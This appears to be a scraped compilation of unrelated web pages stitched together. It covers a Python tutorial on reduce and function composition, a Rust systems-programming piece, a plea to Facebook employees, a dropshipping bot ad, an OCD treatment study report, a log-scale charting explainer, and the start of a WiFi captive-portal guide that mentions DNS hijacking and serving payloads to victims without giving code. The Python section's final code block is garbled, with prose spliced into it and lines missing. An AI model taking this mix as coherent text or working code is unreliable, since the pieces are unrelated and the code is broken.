<h2 id="reduce-it">Reduce it</h2>

<p>What if we want to get a single value as a result? Functional programming toolset has 
this function called <a href="https://docs.python.org/3/library/functools.html#functools.reduce">reduce</a>:</p>

<div><div><pre><code><span>from</span> <span>functools</span> <span>import</span> <span>reduce</span>

<span>#...
</span><span>x</span> <span>=</span> <span>map</span><span>(</span><span>calculate</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>reduce</span><span>(</span><span>lambda</span> <span>c</span><span>,</span> <span>i</span><span>:</span> <span>c</span> <span>+</span> <span>i</span><span>,</span> <span>x</span><span>)</span>
</code></pre></div></div>

<p>Actually, <code>reduce(lambda c, i: c + i, x)</code> is the same as
<code>reduce(operators.add, x)</code>. It is also equivalent to <code>sum(x)</code> on Python,
so the same above could be expressed as:</p>

<div><div><pre><code><span>#...
</span><span>x</span> <span>=</span> <span>map</span><span>(</span><span>calculate</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>sum</span><span>(</span><span>x</span><span>)</span>
</code></pre></div></div>

<p>It is important to note here, that <code>lambda c, i: c + i</code> is a function
and could be replaced with anything. For example, calculating is not
that difficult either (but there are better ways):</p>

<div><div><pre><code><span>def</span> <span>accumulate</span><span>(</span><span>cumulative</span><span>,</span> <span>current_item</span><span>):</span>
    <span>count</span><span>,</span> <span>sum</span> <span>=</span> <span>cumulative</span>
    <span>return</span> <span>count</span> <span>+</span> <span>1</span><span>,</span> <span>sum</span> <span>+</span> <span>current_item</span>

<span>#...
</span><span>x</span> <span>=</span> <span>map</span><span>(</span><span>calculate</span><span>,</span> <span>x</span><span>)</span>
<span>x</span> <span>=</span> <span>reduce</span><span>(</span><span>accumulate</span><span>,</span> <span>x</span><span>,</span> <span>initial</span><span>=</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>))</span>
<span>average</span> <span>=</span> <span>x</span><span>[</span><span>1</span><span>]</span> <span>/</span> <span>x</span><span>[</span><span>0</span><span>]</span>
</code></pre></div></div>

<h2 id="composing-functions">Composing functions</h2>
<p>I’ve just used (introduced?) an extremely important concept in FP -  function composition. It deserves
a special mention.</p>

<p>In the part <code>reduce(accumulate, ...)</code> you can see that we are calling a function, that takes another
function as the argument. To be used inside <code>reduce</code> the <code>accumulate</code> function has to satisfy 
the same signature requirements (if such a thing exists in Python at all…) - it takes two arguments
and returns a single value. The first argument and the return value should be (preferably) of the same 
type.</p>

<p>Then, when the time comes, <code>reduce</code> will call our supplied function to accumulate the stream of values
into a single value (it will get <em>reduced</em>). 
For developers who know their <a href="https://en.wikipedia.org/wiki/Object-oriented_programming">OOP</a>, 
it is the same as a <a href="https://en.wikipedia.org/wiki/Strategy_pattern">Strategy pattern</a>.</p>

<p>We can use the same idea in our functions as well. For example, let’s say we are writing a 
function to normalize some input data, but we want to let our users choose if the text
should be processed uppercased or lowercased. We could implement that like this:</p>

<div><div><pre><code><span>def</span> <span>noop</span><span>(</span><span>text</span><span>):</span> <span># default function that does nothing
</span>    <span>return</span> <span>text</span>

<span>def</span> <span>clean_text</span><span>(</span><span>text</span><span>,</span> <span>text_processor</span><span>=</span><span>noop</span><span>):</span>
    <span>text</span> <span>=</span> <span>text</span><span>[:</span><span>10</span><span>]</span>
    <span>text</span> <span>=</span> <span>text_processor</span><span>(</span><span>text</span><span>)</span>
    <span>return</span> <span>text</span>

<span>first_use</span> <span>=</span> <span>clean_text</span><span>(</span><span>"aaAA"</span><span>,</span> <span>str</span><span>.</span><span>upper</span><span>)</span>
<span>second_use</span> <span>=</span> <span>clean_text</span><span>(</span><span>"aaAA"</span><span>,</span> <span>str</span><span>.</span><span>lower</span><span>)</span>
<span>third_use</span> <span>=</span> <span>clean_text</span><span>(</span><span>"aaAA"</span><span>)</span>
</code></pre></div></div>
<h3 id="factory-functions">Factory functions</h3>

<p>The version of the <code>clean_text</code> above can be unwieldy to use with <code>map</code> so it is often beneficial
to create a factory function, that creates the version of <code>clean_text</code> that has only a single
argument but you still get to choose which text processing function to use:</p>

<div><div><pre><code>
<span>def</span> <span>clean_text</span><span>(</span><span>text_processor</span><span>=</span><span>noop</span><span>):</span>
    <span>def</span> <span>step</span><span>(</span><span>text</span><span>):</span>
        <span>text</span> <span>=</span> <span>text</span><span>[:</span><span>10</span><span>]</span>
        <span>text</span> <span>=</span> <span>text_processor</span><span>(</span><span>text</span><span>)</span>
        <span>return</span> <span>text</span>
    <span>return</span> <span>step</span>

<span>items</span> <span>=</span> <span>map</span><span>(</span><span>clean_text</span><span>(</span><span>str</span><span>.</span><span>lower</span><span>),</span> <span>items</span><span>)</span>
</code></pre></div></div>

<p>This is also a perfect way to create configurable functions.</p>

<h3 id="better-composition-examples">Better composition examples</h3>
<p>In the example above, we could move the text_processor to the pipeline itself:</p>

<div><div><pre><code><span>def</span> <span>clean_text</span><span>(</span><span>text</span><span>):</span>
    <span>text</span> <span>=</span> <span>text</span><span>[:</span><span>10</span><span>]</span>
    <span>return</span> <span>text</span>

<span>items</span> <span>=</span> <span>map</span><span>(</span><span>clean_text</span><span>,</span> <span>items</span><span>)</span>
<span>items</span> <span>=</span> <span>map</span><span>(</span><span>str</span><span>.</span><span>lower</span><span>,</span> <span>items</span><span>)</span>
</code></pre></div></div>

<p>so a better example would be a randomizing post-processing function, to augment 
text examples for your neural network. We will make this augment function configurable,
so the users of the function can choose the possible augmentations:</p>

<div><div><pre><code><span>import</span> <span>random</span>

<span>def</span> <span>clean_text</span><span>(</span><span>text</span><span>):</span>
    <span>text</span> <span>=</span> <span>text</span><span>[:</span><span>10</span><span>]</span>
    <span>return</span> <span>text</span>

<span>def</span> <span>augment</span><span>(</span><span>augmentations</span><span>):</span>
    <span>def</span> <span>step</span><span>(</span><span>text</span><span>):</span>
        <span>augmentation</span> <span>=</span> <span>random</span><span>.</span><span>choice</span><span>(</span><span>augmentations</span><span>)</span>
        <span>return</span> <span>augmentation</span><span>(</span><span>text</span><span>)</span>
    <span>return</span> <span>step</span>

<span>items</span> <span>=</span> <span>map</span><span>(</span><span>clean_text</span><span>,</span> <span>items</span><span>)</span>
<span>items</span> <span>=</span> <span>map</span><span>(</span><span>augment</span><span>([</span><span>noop</span><span>,</span> <span>str</span><span>.</span><span>lower</span><span>,</span> <span>str</span><span>.</span><span>upper</span><span>]),</span> <span>items</span><span>)</span>
</code></pre></div></div>



<p>Often, I get to see functions that look something like this:</p>

<div><div><pre><code>
<span>def</span> <span>some_big_function</span><span>(</span><span>x</span><span>,</span> <span>z</span><span>):</span>

<p>while the specific example above is not that bad because it is rather clear 
what’s happening just because it is ~10 lines long, I am not happy when I find
code like this.</p>

<p>This big function can be deconstructed in a few smaller functions (let’s pretend
that this code is 100 lines long) and those functions can then become a part
of the pipeline.</p>

    <span>return</span> <span>e</span> <span>is</span> <span>None</span>

    <span>return</span> <span>e</span> <span>==</span> <span>"a"</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598813964607/cahJGXdrf.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>That's a pretty daring question considering Rust has been around for a fairly short amount of time and in that time has become the most loved language for 5 years in a row, according to the Stack Overflow <a target="_blank" href="https://insights.stackoverflow.com/survey/2020#technology-most-loved-dreaded-and-wanted-languages-loved">Developer Surveys</a>.</p>
<p>It is very clear that developers love working with Rust, many big companies have been adopting it to fix many of the memory issues C and C++ have caused by taking advantage of Rust's memory safety capabilities. Microsoft recently started rewriting <a target="_blank" href="https://msrc-blog.microsoft.com/2019/11/07/using-rust-in-windows/">core components</a> of Windows in Rust and the folks in charge of Linux have been talking about integrating Rust to the <a target="_blank" href="https://lore.kernel.org/lkml/CAKwvOdmuYc8rW_H4aQG4DsJzho=F+djd68fp7mzmBp3-wY--Uw@mail.gmail.com/T/">kernel</a>. That's a big step for Rust.</p>
<p>But the question remains... should we trust Rust with the future of systems programming?</p>

<p>As much as it costs to admit, Rust is still a young language compared to C, which has been around for over 48 years and still is the preferred language for <strong>systems programming</strong>, every major operating system in the world is written in C/C++, as well as their drivers, utilities and built-in software.</p>
<p>But is Rust up to the challenge? Many developers have been rewriting software written in C with Rust, demonstrating that it is not only capable of competing with it but also of generating faster, more reliable software by taking advantage of Rust's modern features.</p>
<p>Here's a small <a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/">list</a> of projects to check out:</p>
<ol>
<li><a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/#bat">bat</a> -&gt; is a <code>cat</code> clone with syntax highlighting.</li>
<li><a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/#exa">exa</a> -&gt;  is a modern replacement for <code>ls</code>.</li>
<li><a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/#starship">starship</a> -&gt; is a minimal, blazing-fast, and infinitely customizable prompt for any shell.</li>
<li><a target="_blank" href="https://zaiste.net/posts/shell-commands-rust/#ripgrep">ripgrep</a> -&gt; is an extremely fast alternative to <code>grep</code></li>
</ol>

<p>While having programs rewritten in Rust is pretty cool, being able to write low-level components is a must-have for a language that intends to become #1 for systems programming, things such as the kernel and drivers. There are no immediate plans to rewrite current operating systems in Rust, but there is a project created by <a target="_blank" href="https://twitter.com/jeremy_soller">Jeremy Soller</a>, System76 Principal Engineer called <a target="_blank" href="https://www.redox-os.org/">RedoxOS</a>.</p>
<blockquote>
<p>Redox is a Unix-like Operating System written in Rust, aiming to bring the innovations of Rust to a modern microkernel and full set of applications.</p>
</blockquote>
<p>Redox aims to demonstrate Rust's systems programming capabilities to a full extent, having written not only the kernel in Rust but also every piece of software that it ships with it. One of those is <a target="_blank" href="https://gitlab.redox-os.org/redox-os/relibc/-/blob/master/README.md">relibc</a>, a portable POSIX C standard library compatible with Redox and Linux. Redox isn't currently going to replace your existing OS, but it's a fun thing to try.</p>
<p>Rust still has a long way to go before it can compete with a language like C, but the future is looking very promising.</p>

<p>While Rust has come a long way but it still lacks many of the features that C/C++ programmers take for granted, just to name a few:</p>
<p><strong>Compile-time code/type generation and verification</strong> -&gt; Rust does have a procedural macro system that can be used to accomplish these things but it's not remotely the same.</p>
<p><strong>Static Analysis</strong> -&gt; There may be more tools available for C++ but the quality of the static analysis built right into Rust's type system blows all of them away, no tool can reliably prevent dangling references or data races in C++. As far as only using safe Rust, static analysis is in a way better shape than C++ because it has nothing as powerful as the borrow checker.</p>
<p><strong>Sanitizers</strong> -&gt; Due to the type system, safe Rust code has much less need for sanitizers, when it comes to unsafe code, C++ has the advantage as it has more tools available.</p>
<p>There's also safe transmutation (safely cast “plain old data” types to and from raw bytes), safe support for C style unions, and fallible allocation (fail gracefully from allocation failure, rather than panic) as stated by Microsoft.</p>

<p>As many missing features Rust has, its safe to say that, in time, Rust may become the language of choice for systems programming. Rust has an amazing community of developers that work hard every day to bring new features to the language, especially now that Microsoft supports Rust into becoming a better and more useful language. </p>
<blockquote>
<p>We at Microsoft will be able to help in these endeavors to shape the future of the language to improve its usefulness [...]. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>I <a href="https://www.linkedin.com/posts/jasonmcintosh_facebooks-kenosha-guard-militia-event-was-activity-6705852062460084224-G5e9">posted the following note to my LinkedIn page</a> earlier today, where I also <a href="https://daringfireball.net/linked/2020/08/29/facebook-kenosha-guard-455-times">linked to this Daring Fireball article</a>.</em></p>

<p>A note to my friends who still work at Facebook:</p>

<p>You are at the top of your career. The very fact of your job at Facebook demonstrates a level of technical acumen that would allow you to work anywhere you wish within the technology sector.</p>

<p>The time has come for you to take advantage of this. Your employer has become unworthy of your talent. Please quit. Work for a company doing literally anything else.</p>

<p>From promoting hateful conspiracy theories to favoring Trump’s re-election, <a href="https://fogknife.com/2019-05-23-i-read-ruined-by-design.html">Facebook’s drive for emotionally fueled “engagement” over all else</a> steals the light from our shared human future in order to enrich a handful of people.</p>

<p>I know that you do not identify as a white supremacist. Facebook, however, funnels most of your talent directly into growing and empowering white supremacy’s most significant technological ally in spreading hate.</p>

<p>I urge you to think of your own career prospects, as well. The peak of Facebook’s positive reputation already lay in the past. After this year, employers will justifiably assume that hiring someone from Facebook would risk bringing in a culture of division, deception, and algorithmically optimized racism.</p>

<p>Please, for your own sake, if not for the sake of the future: leave Facebook. Do it today, before it ruins you.</p>

              We aim to establish “legal priorities research” as a new research field. We currently focus on four <a href="https://www.legalpriorities.org/research.html#research-focus">cause areas</a>: improving the governance of advanced artificial intelligence,
              mitigating risks from synthetic biology, mitigating extreme risks from climate change, and improving institutional design and decision-making. Our research is influenced by the principles of <a href="https://www.effectivealtruism.org/" target="_blank" rel="noopener noreferrer">effective altruism</a> and the longtermism paradigm.

            <p>No one believed it could be done but we always did. So we got to work and designed YOU a bot from the mind of an amazon dropshipper.</p>
            <p>We designed a proprietary algorithm that mines, scrapes, sorts and filters winning products for you on autopilot. So that you can focus on the other important aspects of your business.</p>
            <p>Now we want you to experience what we experienced: The redemption of our time!</p>

          <div>
            <p><span>Sort Through Qualified Products</span></p><p>We designed the app to filter and weed out the diamonds in the rough. This has virtually never been done before, since we ourselves our dropshippers we knew exactly What the amazon dropshipping community wanted to experience.</p>
            <p> Sorting Options like: price, category, sellers on listings, buyBox Eligibility and the potential for profit</p>
            <p>The most exciting part of this all, is that you are able to download all of the Winning products that are profitable and export them as a CSV.</p>

The approach known as <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fajp.psychiatryonline.org%2Fdoi%2Fabs%2F10.1176%2Fappi.ajp.2020.19080886&amp;t=NmNjOTcxMjUyNDNhZjE1ZmIwZmEwNzAyMDgzMzViMmNiMGE5N2E2MixnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1598977423">‘exposure therapy’, a form of cognitive behavioral therapy, or CBT, was more effective and reduced symptoms more as time went on, compared with stress-management therapy</a>, also known as SMT.</p><p>But when the researchers looked back at the brain scans taken before the patients began therapy, and linked them to individual treatment response, they found striking patterns.</p><p>The brain scans were taken while patients performed a simple cognitive task and responded to a small monetary reward if they did the task correctly.</p><p>Those who started out with more activation in brain circuits for processing cognitive demands and reward during the tests were more likely to respond to CBT – but those who started out with less activation in those same areas during the same tests were more likely to respond well to SMT.</p><p>“We found that the more OCD-specific form of therapy, the one based on exposure to the focus of obsession and compulsion, was better for relieving symptoms, which in itself is a valuable finding from this head-to-head randomized comparison of two treatment options,” says <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmedicine.umich.edu%2Fdept%2Fpsychiatry%2Fstephan-taylor-md&amp;t=OThiODM3NzgwNWMxYmZjZDNhMDU1MjE4ZjU2ZjI3YjAyNGJjODZjNixnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1598977423">Stephan Taylor, M.D.</a>, the study’s senior author and a professor of psychiatry at Michigan Medicine, U-M’s academic medical center. “But when we looked at the brain to see what was behind that response, we found that the more strength patients had in certain brain areas were linked to a greater chance of responding to exposure-based CBT.”</p><h2><b>Key brain regions involved in studying OCD</b></h2><p>The brain regions and circuits that had the strongest links to treatment have already been identified as important to OCD – and have even been targets for treatment with an emerging therapy called transcranial magnetic stimulation.</p><p>Specifically, stronger activity in the circuit called the cinguloopercular network during the cognitive task, and stronger activity in the orbitostriato-thalamic network when the reward was at stake, was associated with better response to exposure-based CBT. But lower activity in both regions was associated with better response to the stress-reduction SMT. The effects didn’t vary across age groups.</p><p>“These findings speak to a mechanism for therapy’s effects, because the brain regions associated with those effects overlap substantially with those implicated previously in this disorder,” says Luke Norman, Ph.D., who led the work as a U-M neuroscience postdoctoral fellow and is now a scientist at the National Institutes of Health. “This suggests we need to draw upon the most-affected networks during therapy itself, but further research is needed to confirm.”</p><p>The brain scans were done while patients underwent a test that required them to correctly pick the correct letter out of a display, and offered a potential monetary reward if they performed the task correctly. This measured both their ability to exert control over their cognitive processes in picking out the right letter, and the extent to which the promise of a reward motivated them.</p><figure data-orig-width="850" data-orig-height="478"><img src="https://64.media.tumblr.com/f606c03e13777957afd9b7ca52f1da45/ce424dd158826732-61/s1280x1920/c861a16fef139b4cd7b17f72683ee3a830e74f38.jpg" alt="image" data-orig-width="850" data-orig-height="478" width="850" height="478"></figure><p><i>Image:&nbsp;The colorful brain regions show where differences in activation were associated with differences in OCD treatment response.

Past research has already linked it to OCD and treatment response in general, and it’s thought to play a key role in self-regulation of response to OCD triggers. Previously, the U-M team had shown that in general, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flabblog.uofmhealth.org%2Flab-report%2Fstuck-a-loop-of-wrongness-brain-study-shows-roots-of-ocd&amp;t=N2RkMDVkZTFkYzJjY2E1NWI0OGFlMzViZWYyNzU3Y2RiZTM4NzQyMixnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1598977423">people with OCD tend to have reduced activation in the rACC</a> when asked to perform tasks that involve cognitive control.</p><p>Among those who responded best to CBT, the researchers saw stronger pre-treatment activation in areas of the brain associated with learning how to extinguish fear-based responses to something that has caused fear in the past. Because exposure therapy for OCD involves facing the thing or situation that provokes obsessive and fearful responses, having a stronger ability to be motivated by rewards might help someone stick with therapy despite having to face their triggers.</p><h2><b>Personalizing OCD treatment</b></h2><p>The findings suggest a path to personalizing the choice of therapy not by doing brain scans on everyone with OCD – which would be impractical – but by using everyday tests that measure the kinds of characteristics that might predict better success with one therapy or the other.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.uofmhealth.org%2Fprofile%2F576%2Fkate-dimond-fitzgerald-md&amp;t=M2FkZGVlOTc5NTczN2JjZTc2YTMwOWQwNGY3MWIxMGNjYzM5OWJjNSxnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1598977423">Kate Fitzgerald, M.D.</a>, a pediatric OCD specialist at Michigan Medicine who is co-senior author of the paper and leads multiple studies of OCD therapy for children and adolescents, explains that easily administered behavioral tests could be developed to help therapists recommend CBT to those who have the most cognitive control and reward responsiveness, and SMT to those who would benefit most from being taught to relax and use problem-solving techniques to improve their response to stressors.</p><p>But computer-based brain-training exercises that can strengthen these tendencies, and rewards for exposing oneself to the thing or action that triggers OCD symptoms, may hold the potential to improve therapy response, she says.</p><p>“This kind of research may help inform efforts to do cognitive control training and ramp up the circuits that help patients overcome conflict between obsessive fears and insight that these fears don’t make sense so that patients can dismiss the fear as improbable, rather than trying to make it go away with compulsive behaviors,” she says. “Our research shows that different brains respond to different treatments, and if we can build on this knowledge we could move toward a more precision-medicine approach for OCD.”</p><p>In children and teens, whose brains are still maturing, there’s an especially good chance of helping them improve their brains’ control functions.</p><h2><b>New research to advance OCD understanding</b></h2><p>Fitzgerald and her team are currently recruiting <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fclinicaltrials.gov%2Fct2%2Fshow%2FNCT03584945%3Frecrs%3Dab%26cond%3Dobsessive%2Bcompulsive%2Bdisorder%26age%3D0%26draw%3D2%26rank%3D7&amp;t=NzliNjFjMWNhYWExMTZiN2ExYWZiOWYxZmY5YjA5ZThlNGYxMTBjZixnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1598977423">young people with diagnosed OCD, and OCD-like tendencies, for a clinical trial that provides CBT</a> and includes brain scanning before and after therapy.</p><p>Since OCD symptoms typically start in the tween years, though diagnosis may not occur until the teen or young adult years, it’s important to study children with sub-clinical symptoms, she notes.</p><p>Though the study involves in-person interactions for the brain scans, the CBT exposure therapy is done through video chat. In fact, Fitzgerald says, this can make it easier for children and teens to confront the item or situation that triggers their OCD-like impulses, because these are often found in the home environment.</p><p>“We need families and patients to engage with researchers in studies like these,” says Fitzgerald. “Only through research can we understand what works best for different groups of patients. And perhaps by doing so we can expand the availability of the most evidence-based OCD therapies – including by engaging psychologists and clinical social workers in leading treatment programs, in addition to psychiatrists at specialized centers.”</p><p>–</p><p><b>Source: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flabblog.uofmhealth.org%2Fbody-work%2Fwhich-ocd-treatment-works-best-new-brain-study-could-lead-to-more-personalized-choices&amp;t=NTIyN2E4ZDkwNGM5ZDAzNDFkYWVmYjkzNDM0OTYxMGVmYjBmZWQ2MixnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1598977423">University of Michigan</a></b></p><p><b>Full study:</b>&nbsp;“Treatment-Specific Associations Between Brain Activation and Symptom Reduction in OCD Following CBT: A Randomized fMRI Trial”,&nbsp;<i>American Journal of Psychiatry</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1176%2Fappi.ajp.2020.19080886&amp;t=OTg3MGJjMTFhMzQyMmE5YWY5ZjgzZDJjOGZiMDQ3ZDk1NzZmNTZkMyxnOWo3RE1BWQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627900402450497536%2Fpersonalized-ocd-treatment&amp;m=0&amp;ts=1598977423">https://doi.org/10.1176/appi.ajp.2020.19080886</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/180354004837/smartphone-app-for-ocd">Simple smartphone app that could help OCD sufferers</a></p>

August 30, 2020 | https://blog.datawrapper.de/weeklychart-logscale/ | <a href="https://web.archive.org/web/*/https://blog.datawrapper.de/weeklychart-logscale/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
            <p><em>This is part 1 of a series by the data visualization tool <a href="https://www.datawrapper.de/" target="_blank" rel="noopener">Datawrapper</a> that explains log scales. Visit <a href="https://blog.datawrapper.de/weeklychart-logscale2/">part 2</a> or <a href="https://blog.datawrapper.de/weeklychart-logscale3/">part 3</a>.</em></p>
<p>As promised <a href="https://blog.datawrapper.de/weeklychart-scatterplotlinechart">last week</a>, we have a closer look at the logarithmic scale this week. I won’t get into mathematical details to explain what a logarithm is – I won’t even explain when we should use log scales instead of linear scales. This and next week, I’ll explain what log scales can tell us.</p>
<p>We start slowly. Here’s a chart that’s not on a log scale –&nbsp;not yet:</p>
<hr>

<p>We will transform it to a chart with a log scale in a minute (in <a href="https://www.datawrapper.de/" target="_blank" rel="noopener">Datawrapper</a>, it’s as easy as clicking on a checkbox). First, let’s learn some basics about log scales, to understand what they tell us:</p>
<h3 id="Log-scales-show-relative-values">Log scales show relative values</h3>
<p><strong>Log scales show relative values instead of absolute ones.</strong> Log scales don’t care that 101 minus 100 equals the same as 2 minus 1. Instead, they are concerned with percentages: the difference between 100 and 101 is a 1% increase, while the difference between 1 and 2 is a 100% increase. So on a log scale, the distance between 100 and 101 is roughly 1% of the distance between 1 and 2:</p>
<p><img alt="" data-src="/img/full-180531_log6.png" data-src-thumb="/img/thumb-180531_log6.png" src="https://blog.datawrapper.de/img/thumb-180531_log6.png"></p>
<h3 id="The-same-distance-on-a-log-scale-shows-the-same-rate">The same distance on a log scale shows the same rate</h3>
<p>So what do same distances on a log scale show? They show the same percentage growth or decline. Imagine you eat candy for money and your business grows yearly by 100%. That means every year you eat twice as many candies than you ate the previous year.</p>
<p>In year zero, you start by eating <strong>1</strong> candy.</p>
<p>In the 1st year, you eat <strong>2</strong> candies. The year after that, you eat <strong>4</strong> candies. In the 3rd year, you eat <strong>8</strong> candies. By year 5, you eat <strong>32</strong> candies, and on your 25th anniversary, you would be eating <strong>33.5 million</strong> candies.</p>
<p>On a linear scale, a line chart plotting these numbers would go insanely high very quickly. On a log scale, each of these amounts takes up the same space, because, in each year, the number of candies <strong>grows at a fixed rate (100%)</strong>.</p>
<p><img alt="" data-src="/img/full-180531_log1.png" data-src-thumb="/img/thumb-180531_log1.png" src="https://blog.datawrapper.de/img/thumb-180531_log1.png"></p>
<h3 id="How-to-read-a-log-scaled-chart">How to read a log scaled chart</h3>
<p>Let’s see what that means for our chart. Here, the log scale can show us two things that the linear scale can’t show us: First, the <strong>drop of short-term arrivals in the Second World War</strong>. There wasn’t a stark drop in <em>absolute</em> numbers (that’s why we can’t see it in the chart up there), but it was a stark drop in <em>relative</em> numbers:</p>

<p><strong>How stark?</strong> Well, we know by now that the same unit on a log scale represents the same growth rate. Looking closer, we see that the drop during the Second World War is almost as “deep” as the growth afterward is “high”. In April 1942, only 40 people visited New Zealand. Three years earlier, there were 33 times as many tourists: 1,310 in total. It took ten years to get back to that number of 1,300 tourists (for April) – that’s the brown range in our chart. But the growth didn’t stop there. Within 32 years, the number of tourists in New Zealand grew again by 33 times and reached 45,700 tourists in 1984 – that’s the blue range.</p>
<p>The <strong>blue range has the same height as the brown range because both ranges represent a 33-fold increase</strong>; no matter their absolute values. So during the Second World War, the arrivals in New Zealand dropped almost by the same rate between 1939 and 1942 as they increased between 1952 and 1984. That’s something the log scale can tell us and the linear scale can’t.</p>
<p>The log scale also shows us something about the arrivals each season. We can see that the ups and downs get smaller over time. So we can conclude that <strong>seasonal increase and decrease of arrivals each year happened at a higher rate</strong> before the Second World War than after the Second World War, and at an even lower rate since approximately 1985.</p>

<p><em>Next week, we’ll explore magnitudes, and how log scales are ideal to show exponential growth. <a href="https://blog.datawrapper.de/weeklychart-logscale2/">Visit the article here.</a></em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>This is the most comprehensive guide to Captive Portal on the planet.</p><p>I’m going to show you how you can build your own Captive Portal Software for Hacking, Business Security, and Growth.</p><p>In short: if you want to leverage WiFi Captive Portals for improving your Business, you’ll love this guide.</p><p>Let’s get started.</p><p><note>Sharpen your Network Security skills with <b>rootsh3ll Labs</b>, right from your browser. Click to <a href="https://labs.rootsh3ll.com/?ref=" captive-portal-guide"="">start you first lab</a></note></p><p>Operating in an Enterprise, studying in a college or sitting in Starbucks, you must have encountered a login screen like this once.</p><p>You connect to the WiFi network and it greets with you a similar login screen. That page is called a captive portal.</p><p>But, what is a captive portal exactly, How does it work and how the system knows where the captive portal is?</p><p>These are all the questions you are going to uncover from this guide and take-away the knowledge to build your own captive portal for your company, institute etc and use it for fun and profit.</p><p>Technically speaking, an authentication screen is displayed when a wireless user is not authorized to access the network resources. The authentication page is called a captive portal login.</p><p>1. DNS Redirection<br>
2. Splash page</p><p>DNS redirection works as the simple DNS hijacking where all the user DNS requests are hijacked and resolved to the captive portal login page. But, after widespread use of HSTS header implementation, DNS redirection hits a low success ratio providing no better service to the users.</p><p>Whereas, a Splash Page works in a little different fashion. It also uses DNS redirections but, it responds to the requests acc. to the operating systems which trick the O.S in believing there is a captive portal login in place and forcing the O.S to automatically trigger the login page to the user.</p><p>When a client device is connected to the WiFi, If unauthorized to access the Internet, A screen automatically pops up to display the captive portal.</p><p>A Splash page not only bypasses HSTS implementations on most websites but also gives you the flexibility of showing O.S specific login pages.</p><div>

<p>The only difference in regular captive portal and splash page is that splash page pulls up the captive portal login page automatically. Whereas, the DNS redirection based method requires a user to manually open up a website.</p>
<p>Imagine if a user is using a mobile app only, how would a user know he needs to log in? If you are a hacker you will lose your victim because the device will automatically disconnect upon no Internet access. So, this leads us to the much better and flexible option for triggering captive portal login page, the Splash Screen.</p>
<p>As a business operator, you can show a different kind of services to different client devices, whereas as an attacker you can identify victim machine automatically and serve the payload accordingly. I’ll showcase its crux, and leave implementation upon your creativity and requirement.</p>

<h2>Different Client Behaviours</h2>
<p>Now comes the technical theory part of this guide. It is important for you to understand the theory behind a captive portal before diving into the practical aspect of it.<br>
<a href="#start-ap">Click here</a> to skip the theory and jump into action</p>
<h3>Basic Strategy behind portal detection</h3>
<p>Every operating system has its own different way of detecting Internet access.</p>
<p>The mechanism is this basically:</p>
<pre>GET/POST http://foo.com/bar.html
If bar.html == [expected content] &gt; Open Internet
If bar.html != [expected content] &gt; Captive Portal
If bar.html[status] != SUCCESS &gt; No Network
</pre>
<p><a href="https://twitter.com/intent/tweet?text=A%20Practical%20step-by-step%20Guide%20to%20Captive%20Portals%20%23WiFiHacking&amp;url=https://rootsh3ll.com/captive-portal-guide&amp;via=rootsh3ll&amp;original_referer=https://rootsh3ll.com/captive-portal-guide%20%26via%3Drootsh3ll" target="_blank" rel="nofollow noopener noreferrer"><span>Tweet this Captive Portal Guide</span><span><span></span><span></span><span></span></span></a></p>
<p>If a Captive Portal is not in place, the result will match the expected one and the OS will know that there is full access to the Internet.</p>
<p>If the URL returns a result other than the expected one, then the OS will detect that there is a Captive Portal in place and that it’s needed to proceed with authentication in order to get full access to the Internet: In this case, the OS will open the Splash Page automatically.</p>
<p>All client devices use the above-described strategy to find out if they are behind a captive portal, but the URL might vary depending on the specific model of smartphone, tablet, laptop and depending on the specific OS version. In the following, you can find the list of domains that are contacted by each model in order to detect the captive portal.</p>
<h3>Captive Portal Detection method by various Operating Systems</h3>
